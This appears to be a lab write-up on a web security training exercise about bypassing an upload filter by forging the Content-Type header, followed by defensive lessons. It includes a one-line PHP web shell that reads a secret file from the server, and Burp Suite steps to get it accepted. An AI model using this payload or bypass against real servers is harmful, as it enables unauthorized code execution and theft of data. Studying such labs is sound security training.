# Lab: Web Shell Upload via Content-Type Restriction Bypass

## Vulnerability

This lab demonstrates a file upload vulnerability where the application relies on the user-supplied `Content-Type` header to validate uploaded files.

## Explanation

The application only allows image files such as PNG and JPEG.

However, the validation can be bypassed by modifying the `Content-Type` of the upload request in Burp Suite while keeping the `.php` extension.

## Steps to Reproduce

1. Navigate to the **My Account** page.
2. Create a PHP file containing the exploit:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Attempt to upload the PHP file.
4. The application rejects it because only PNG and JPEG files are allowed.

<img width="945" height="72" alt="image" src="https://github.com/user-attachments/assets/cc7b3cfc-4547-4f81-8d28-1040224fee0e" />
   
5. Intercept the upload request using Burp Suite.
6. Change:

```http
Content-Type: application/octet-stream
```

<img width="314" height="82" alt="image" src="https://github.com/user-attachments/assets/38282bff-6a38-49d1-9e94-d1aac2e7c379" />


to:

```http
Content-Type: image/png
```

7. Keep the filename as:

```text
shell.php
```

8. Forward the request.
9. The server accepts and uploads the PHP file.

<img width="303" height="121" alt="image" src="https://github.com/user-attachments/assets/2f34f8da-069e-4856-a4cb-3dd64b3a16bf" />

    
10. Open the uploaded avatar in a new tab.
11. Observe Carlos's secret in the response.

    
<img width="776" height="87" alt="image" src="https://github.com/user-attachments/assets/c2f534e2-55e0-4405-9fe8-9f689bb453ae" />

## How It Works

* The application checks the `Content-Type` supplied by the client.
* The attacker changes the Content-Type to `image/png`.
* The application accepts the file even though its contents are PHP code.
* The `.php` extension remains unchanged.
* When the uploaded file is accessed, the server executes the PHP code.

## Impact

An attacker can bypass file-type restrictions and upload a malicious server-side script, potentially leading to **Remote Code Execution (RCE)** and unauthorized access to sensitive information.

## Learning

File upload validation should not rely solely on the client-supplied `Content-Type` header. The application should validate the actual file contents and prevent uploaded files from being executed as server-side code.
